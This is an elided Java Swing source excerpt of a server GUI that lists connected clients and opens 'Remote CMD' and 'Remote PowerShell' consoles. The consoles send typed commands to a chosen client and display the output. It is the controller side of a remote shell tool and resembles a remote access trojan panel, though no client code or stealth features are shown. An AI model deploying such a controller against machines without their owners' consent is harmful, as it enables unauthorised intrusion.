...
public class Server {
    ...
    public static void main(String[] args) {
        ...
        JMenuItem cmdExecuteItem = new JMenuItem("Remote CMD");
        JMenuItem psExecuteItem = new JMenuItem("Remote PowerShell");
        ...
        cmdExecuteItem.addActionListener(e -> {
            ...
            if (selectedRow != -1) {
                ...
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    new CmdConsole(client, clientId, "CMD");
                }
            }
        });
        ...
        psExecuteItem.addActionListener(e -> {
            ...
            if (selectedRow != -1) {
                ...
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    new CmdConsole(client, clientId, "PowerShell");
                }
            }
        });
            ...
            try {
                ...
                while (running) {
                    if (dataInputStream.available() > 0) {
                        ...
                        } else if (response.startsWith("CMD_EXECUTE:") || response.startsWith("POWERSHELL_EXECUTE:")) {
                            // Ignore command echoes, wait for actual output
                        } else {
                            final String finalResponse = response;
                            SwingUtilities.invokeLater(() -> {
                                CmdConsole.updateOutput(clientId, finalResponse);
                            });
                        }
                    }
                    Thread.sleep(100);
    ...
    static class CmdConsole extends JFrame {
        ...
        public CmdConsole(ClientHandler client, String clientId, String shellType) {
            this.client = client;
            this.clientId = clientId;
            this.shellType = shellType;

            setTitle(shellType + " Console - Client " + clientId);
            setSize(600, 400);
            ...
            inputField.addActionListener(e -> {
                ...
                if (!command.isEmpty()) {
                    ...
                    String commandPrefix = (shellType.equals("PowerShell")) ? "POWERSHELL_EXECUTE:" : "CMD_EXECUTE:";
                    client.sendCommand(commandPrefix + command);
                    inputField.setText("");
                }
            });
        ...
        public static void updateOutput(String clientId, String output) {
            for (Frame f : Frame.getFrames()) {
                if (f instanceof CmdConsole) {
                    CmdConsole console = (CmdConsole) f;
                    if (console.clientId.equals(clientId)) {
                        SwingUtilities.invokeLater(() -> {
                            console.outputArea.append(output + "\n");
                            console.outputArea.setCaretPosition(console.outputArea.getDocument().getLength());
                        });
                    }
                }
            }
